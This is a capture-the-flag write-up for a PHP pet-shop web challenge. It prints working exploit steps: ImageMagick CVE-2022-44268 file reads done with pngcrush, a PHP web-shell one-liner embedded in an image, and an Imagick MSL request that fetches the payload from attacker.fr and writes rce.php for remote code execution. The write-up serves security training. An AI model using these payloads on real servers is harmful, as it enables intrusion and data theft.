# Instanciafail

## Challenge

>   Summer holidays are approaching, and you don't want to inflict dozens of hours of air travel on your favorite pet.
>   
>   So you decide to do a little research to find a pet shop near you and come across this rather strange site.
>   
>   Retrieve the flag from the server root. 
>
>   Author : `Elweth` 

- Catégorie: Web
- Difficulté: Medium

## Deployment

- Docker compose

```bash
cd src; docker compose up
``` 

## Writeup

The application simulates a pet shop in which a user can create an account, log in and register animals in the pet shop.

Note the /robots.txt which contains :

```
User-agent: *
Disallow: /backup.zip
```

The application appears to expose a backup.zip file, but is not accessible and seems to be protected by an htaccess file.

Once registered, users can also upload a new profile photo; and we notice that when the photo is uploaded it is renamed by adding `-resize` in the file name, seeming to indicate that the image has been resized.

![Image resized](/images/image_resized.png)

A quick Google search reveals a few methods for resizing an image via PHP, and one of them is to use the Imagick library.

A Google search for Imagick-related vulnerabilities quickly turns up CVE-2022-44268

- https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC


This vulnerability makes it possible to add a 'profile' section to our image, and thus trigger an arbitrary file read on the server during conversion.

It's possible to use in-house automated tools to generate the image and parse the output, but it's also possible to do it by hand.

We install the dependencies 

```bash
apt-get install pngcrush imagemagick exiftool exiv2 -y
```

We use pngcrush to add the new section to a PNG to read /etc/hosts :

```bash
pngcrush -text a "profile" "/etc/hosts" sample.png
```

You can confirm that the image has been modified with the following command:

```bash
exiv2 -pS pngout.png
STRUCTURE OF PNG FILE: pngout.png
 address | chunk |  length | data                           | checksum
       8 | IHDR  |      13 | .......X....                   | 0xba50d3ba
  .....
  111269 | tEXt  |      18 | profile./etc/hosts             | 0xc560a843
  111299 | IEND  |       0 |                                | 0xae426082

```

![ModifyImage](/images/insert_profile.png)

Once the file is ready we can upload it on the web application, and download the file resized by the server :

```bash
wget http://node2.challenges.ctf20k.root-me.org:25533/uploads/pngout-resized.png
```

We can confirm that the image has been modified by looking at the checksum or by looking at the size of the image that has changed :

![changes](/images/changes.png)

We can parse the PNG with `identify` to discover the content of the file in hex :


```bash
identify -verbose pngout-resized.png

...

3132372e302e302e31096c6f63616c686f73740a3a3a31096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666530303a3a096970362d6c6f63616c6e65740a666630303a3a096970362d6d636173747072656669780a666630323a3a31096970362d616c6c6e6f6465730a666630323a3a32096970362d616c6c726f75746572730a31302e302e302e31380934353039346436346437343936666134336465356530333638366236623463360a
```

The file has been read and can now be decoded:

```bash
echo -n 3132372e302e302e31096c6f63616c686f73740a3a3a31096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666530303a3a096970362d6c6f63616c6e65740a666630303a3a096970362d6d636173747072656669780a666630323a3a31096970362d616c6c6e6f6465730a666630323a3a32096970362d616c6c726f75746572730a31302e302e302e31380934353039346436346437343936666134336465356530333638366236623463360a | xxd -r -p
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.0.0.18       45094d64d7496fa43de5e03686b6b4c6
``` 

At this point, we could try to read /flag.txt, but the file doesn't exist. Now we remember that a ZIP archive was present but inaccessible. However, we can retrieve it with file read primitive.

Repeat the previous operation:

```bash
pngcrush -text a "profile" "/var/www/html/backup.zip" sample.png
```

Re-upload the image and download the converted image.

The archive has been included in the image and can be retrieved using binwalk :

```bash
binwalk pngout-resized.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 39 x 42, 8-bit colormap, non-interlaced
848           0x350           Zlib compressed data, default compression
```

In the files extracted there is a file with the following content :

![zip](/images/zip_parsing.png)

Delete the 2 first lines to get the ZIP.

```bash
cat 350 | xxd -r -p > backup.zip
unzip backup.zip

Archive:  backup.zip
  inflating: account.php             
   creating: classes/
  inflating: classes/Turtle.php      
  inflating: classes/Animal.php      
  inflating: classes/config.php      
  inflating: classes/User.php        
  inflating: classes/Bird.php        
  inflating: classes/Rabbit.php      
  inflating: classes/Cat.php         
  inflating: classes/Database.php    
  inflating: classes/Dog.php         
  inflating: classes/Hamster.php     
  inflating: classes/Fish.php        
  inflating: index.php               
  inflating: login.php               
  inflating: logout.php              
  inflating: navbar.php              
  inflating: register.php            
 extracting: robots.txt              
  inflating: style.css 
```

We get the source code!

The challenge is now off to a flying start, since we've gained access to the source code.

The code is fairly minimalist, so you can start analyzing it to identify vulnerabilities. As for SQL queries, they all use prepared statements, so are not vulnerable to SQL injections. As for calls to the exec function, they also appear to be correctly secured.

Let's concentrate on the essentials: the registration of animals and how they are created.

The interesting piece of code is this one, and in particular the last 'else' condition :

```bash
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_REQUEST['animal_type']) && isset($_REQUEST['animal_name'])) {
    $animal_type = $_REQUEST['animal_type'];
    $animal_name = $_REQUEST['animal_name'];

    if ($animal_type == 'Cat') {
        $animal = new Cat($animal_name);
    } elseif ($animal_type == 'Dog') {
        $animal = new Dog($animal_name);
    } elseif ($animal_type == 'Bird') {
        $animal = new Bird($animal_name);
    } elseif ($animal_type == 'Fish') {
        $animal = new Fish($animal_name);
    } elseif ($animal_type == 'Hamster') {
        $animal = new Hamster($animal_name);
    } elseif ($animal_type == 'Rabbit') {
        $animal = new Rabbit($animal_name);
    } elseif ($animal_type == 'Turtle') {
        $animal = new Turtle($animal_name);
    } else {
        $animal = new $animal_type($animal_name);
    }

}
```

If the animal entered by the user is not found in the if loop, then it uses the type entered by the user as the class name, and the animal's name as the parameter.

After a bit of research on the Internet, we came across this article by Swarm on the instantiation of arbitrary classes in PHP.

- https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-rce-abusing-object-creation-new-usd_get-a-usd_get-b

The article shows several different primitives, including the reading of arbitrary. At this stage there are several methods of obtaining SSRF / File read etc., but here we don't know the name of the flag and so we need to obtain an RCE.

Getting straight to the point, the article presents a method for using Imagick to create a PHP file disguised as an image and then use an arbitrary write primitive on the server.

We generate the 'image' 

```bash
convert xc:red -set 'Copyright' '<?php system($_GET["a"]); ?>' positive.png
```

Parameters animal_type & animal_name are get from $_REQUEST so we can send them in GET or POST. We use the following request :

```bash
POST /index.php?animal_type=Imagick&animal_name=vid:msl:/tmp/php* HTTP/1.1
Host: node2.challenges.ctf20k.root-me.org:25533
Content-Length: 293
Content-Type: multipart/form-data; boundary=abcde12345
Cookie: PHPSESSID=..
Connection: keep-alive

--abcde12345
Content-Disposition: form-data; name="exec"; filename="exec.msl"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="https://attacker.fr/positive.png" />
<write filename="/var/www/html/rce.php" />
</image>
--abcde12345--
```
The file positive.php has been written in server, and we can RCE and get the flag :


![RCE_instanciafail](/images/rce_instanciafail.png)

We can get the flag in /flag-th3_Fl4g_1s_1nsId3.txt.